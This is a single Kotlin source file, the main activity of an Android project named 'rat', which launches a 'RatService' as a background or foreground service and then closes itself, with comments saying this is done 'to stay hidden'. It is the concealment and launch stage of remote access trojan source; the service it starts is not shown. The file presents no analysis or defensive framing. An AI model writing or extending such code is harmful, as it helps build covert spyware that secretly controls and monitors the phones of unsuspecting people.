// C:\Users\User\AppData\Local\Temp\kilo\rat\app\src\main\java\com\example\rat\MainActivity.kt
package com.example.rat

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Start the RAT service
        val serviceIntent = Intent(this, RatService::class.java)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        // Finish the activity to stay hidden
        finish()
    }
}